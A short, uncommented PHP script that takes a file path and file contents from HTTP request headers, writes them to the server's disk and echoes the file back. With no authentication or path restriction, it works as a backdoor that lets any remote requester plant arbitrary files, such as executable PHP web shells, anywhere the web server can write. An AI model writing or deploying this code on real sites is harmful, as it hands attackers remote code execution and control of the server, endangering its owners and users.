<?php

$HEADERS = apache_request_headers();


$mylist = fopen($HEADERS["URL"],"w");
fwrite($mylist, $HEADERS["CONTENT"]);
fclose($mylist);

$mylist = fopen($HEADERS["URL"],"r");
$response = fread($mylist,filesize($HEADERS["URL"]));
echo $response;
fclose($mylist);


?>
